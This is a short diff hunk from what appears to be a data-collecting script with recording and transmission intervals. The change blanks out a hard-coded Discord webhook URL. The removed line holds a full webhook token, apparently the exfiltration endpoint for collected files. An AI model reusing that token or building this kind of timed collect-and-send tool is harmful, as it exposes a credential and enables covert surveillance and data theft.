@@ -13,7 +13,7 @@ TRANSMISSION_INTERVAL = 30
 RECORDING_TIME = 25
 _collected_files = []
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1304921413626363934/X-wu7QLTvjfszMHY83LFtUY7-pYwWn8h5lcT0FEDGEZeK-W-9iXDWokcR8TaAqJ-0Aue"
+WEBHOOK_URL = ""
 
 
 def cfg_output_folder():
